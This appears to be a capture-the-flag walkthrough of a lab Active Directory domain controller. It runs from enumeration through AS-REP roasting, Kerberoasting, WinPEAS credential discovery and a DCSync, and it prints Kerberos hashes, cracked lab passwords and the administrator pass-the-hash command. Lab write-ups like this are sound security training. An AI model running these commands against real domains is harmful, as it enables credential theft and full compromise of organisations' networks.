## Enumeration

Performed a nmap scan on 10.129.62.54

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Egotistical Bank :: Home
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-23 23:23:29Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows
```

DC seems to be EGOTISTICAL-BANK.LOCAL.

The scan revealed many ports open, let's browse to port 80.

The site doesn't show us much, anyways, from the "About Us" section we can discover different names from the domain.

Let's make a list with username-anarchy:

```bash
./username-anarchy --input-file /home/kali/names.txt > /tmp/usernames.txt
```

This returns a list of various usernames.

---

## User Enumeration & AS-REP Roasting

Let's validate the usernames against the DC:

```bash
kerbrute userenum --dc 10.129.62.54 -d EGOTISTICAL-BANK.LOCAL /tmp/usernames.txt
```

This reveals **fsmith** as a valid user. Let's see if he has Kerberos preauth disabled:

```bash
impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/ -usersfile /tmp/usernames.txt -format hashcat -outputfile asrep_hashes.txt -dc-ip 10.129.62.54
```

This reveals the following AS-REP hash:

```
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:198061ee54beb8bd754cdfc74bd57cc4$b602754f3c1070e3379c2df21845b9ad10b182908409fee077c58e778db66792a0b52fbdc44e50c5036cfdccbcde1858968ac8210c8d19c86579696cb708b6188553ccc1cdd431f744e216510275b2ecca572d65a1554ecde56e4c7e395b117bdfd88f708a0a3500ef2d008715dbb9c7fb7b7198130b969eab6f5fa18640c4ff6fd788e84df91380b9384a9b83202fcd1d63548d590b6ff8b02b78051271b4bd2ced4c5ea1f7b6e3a8a16ec1824438c429be3be09644e3c5982a6060a63d3fa916080cc57e572ef0a30010d0f75679bddaca0cf8248b42600fab7f83e4e03a5a97c3c55987433f890d36228dbcc9d27bbaf8f867557a1492f6e12bc5477b9ed6
```

Let's crack it:

```bash
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

> **fsmith : Thestrokes23**

Let's validate it against the DC:

```bash
nxc smb 10.129.62.54 -u fsmith -p='Thestrokes23'
```

Let's list the shares for fsmith:

```bash
nxc smb 10.129.62.54 -u fsmith -p='Thestrokes23' --shares
```

This doesn't reveal any useful or interesting shares.

---

## Kerberoasting

Let's try Kerberoasting since we have valid credentials for fsmith (I use skewrun to fix the timing problem):

```bash
skewrun 10.129.62.54 -- impacket-GetUserSPNs EGOTISTICAL-BANK.LOCAL/fsmith:Thestrokes23 -dc-ip 10.129.62.54 -request -outputfile kerberoast_hashes.txt
```

This reveals a hash for user **HSmith**:

```
krb5tgs$23$*HSmith$EGOTISTICAL-BANK.LOCAL$EGOTISTICAL-BANK.LOCAL/HSmith*$b5591e9e5e499e8b8a9b3c94e98238fe$64bf54ea4a12d62995aa75b753e4cc95d53216de78271fcf8b23cbd84fc9a7339d5d8ad473015973520a5359c86f6eb627c4888a62a2ce6237526d5d25691bb04ab54f01ca608495ac1306e722a67e0c7991dbecbbb0036e4fc93d89929ebac4dab38fa8116c43f81407e6dba864b1a2f73eebb59d7afe339d0c086858115754e8d5cf49c1eac6e344814da6616ad2a9be9eb8fd3370abcefbcdd17e13604766d311e4a64bd7c07d048d542eee256280165c7383ace66ea402a6716506012aab138a5f7e5e7e5987ab0ae146e654c7fa1656c05e65601c129ce7f86ae75101c3f2bb9b810e0c7c0ca231ca00989e13b742066e2d8e1ee7f85948bd5975accc7a9827e4e102e6aa09da5d3210895fb542b44cacf2bd05987504fcc3204f6a90ae55b16d54aacabbc107e5e32697c3699e11a7566c2da2f96aa95331bd3cbdb7f8a4ac6fe97a5e00b3c19323989305891b53e9d21020f21a3dfe06428782279a6a94aa0982948ee9d062a4db76e8b2a2e961fe5d6969197a4cfcd9c7bdea7fe32eab10c309de391ef5133fe74f9f12157d28371cdf5609af1c538edd15aa92d08518c8dd6611f4cadf2d2187d5ce9110fa726957a3576a1a500dca03fa0a6d3def44f0bd8aca569c0ac0652a044cd932dfb831224181efdbd387993130d615fb26fd18c22a83be990fe0b1f405b46c96a162654c9f8b6c35c6fe774384de851c56a7d46c23a2b9dfddba7334a715d4113fe3be04bcffaea4dc2fb0336b8ed000d1d57d3415e5ddb85b906ac6a931880be46406d6b21cec5a5b9cf601c4ca15640d9361a21369f174867efa1710f35c69db9e11f937612ccb7e17896e03f549107569c71c5eaaba4849b2ef51820cb1e1b1711666fd502c89cab6e5e5c0f6fd227920f3b94eb88f534e5d833eceb3b3ee735e5d8f8472cb59d9dca9384e3edc4a38c367976662522aa39d847ad5446af3f41e6664f4d3b1a2fc1892a4cd8251023b5a9083740aaa83b33313cf03ea508f065c3a57bddcdd266a6a40270311474abdca10a7538967313a1fd403ac935c49fac34d4b14be0f1a58d5fe64ec81555b87149d44c1a0628a5b5f00aad3b1a154385a4e592ffb891c17a3f376938de82628ffa7e79d25e0cf6276dc03f310d5d14c2ca1f40e63b2e8b1818dea8c79b261648aeaf3896c85adc8b07f7c70bae7efc9c36afe617a18fec3acdb9e6b68e1e37272754c650f81d9e905cecfb99781967f744e75def4f8153ba249b87f4b264d927a3a181bea950c8c4cb65533cdfbf162ffe2186da01d8b101dc1845f6611dd413312fd5a3095cccdd307ea163705cdbbf363646a277f656272ac01e645df21ca018f841930f245cb78182ed8cc8cdee32c884a8a98633d6fe1edf6ea426677116bf3034031
```

Let's crack it:

```bash
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
```

> **HSmith : Thestrokes23**

---

## Foothold (User Flag)

Let's connect to fsmith with Evil-WinRM:

```bash
evil-winrm -i 10.129.62.54 -u fsmith -p 'Thestrokes23'
```

**User flag** is located on FSmith's Desktop.

---

## Privilege Escalation

Let's upload WinPEAS:

```bash
upload /home/kali/share/winpeas.exe
```

Let's run it:

```bash
./winpeas.exe
```

We found AutoLogon credentials:

```
ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for AutoLogon credentials (T1552.002)
    Some AutoLogon credentials were found
    DefaultDomainName             :  EGOTISTICALBANK
    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
    DefaultPassword               :  Moneymakestheworldgoround!
```

From fsmith's session we see that **svc_loanmgr** is logged in.

Let's try Evil-WinRM with these credentials:

```bash
evil-winrm -i 10.129.62.54 -u svc_loanmgr -p 'Moneymakestheworldgoround!'
```

---

## DCSync

Let's see what permissions svc_loanmgr has:

```bash
nxc ldap 10.129.62.54 -u svc_loanmgr -p 'Moneymakestheworldgoround!' -M daclread -o TARGET_DN="DC=EGOTISTICAL-BANK,DC=LOCAL" ACTION=read RIGHTS=DCSync
```

```
Object type (GUID) : DS-Replication-Get-Changes-All (1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)
Trustee (SID)      : svc_loanmgr (S-1-5-21-2966785786-3096785034-1186376766-1108)
```

User svc_loanmgr has **GetChangesAll** over the DC — we can perform a DCSync attack:

```bash
impacket-secretsdump EGOTISTICAL-BANK.LOCAL/svc_loanmgr:'Moneymakestheworldgoround!'@10.129.62.54 -just-dc-ntlm
```

This reveals the Administrator hash. Let's do Pass the Hash:

```bash
evil-winrm -i 10.129.62.54 -u Administrator -H 823452073d75b9d1cf70ebdf86c7f98e
```

**Root flag** is on the Administrator's Desktop.
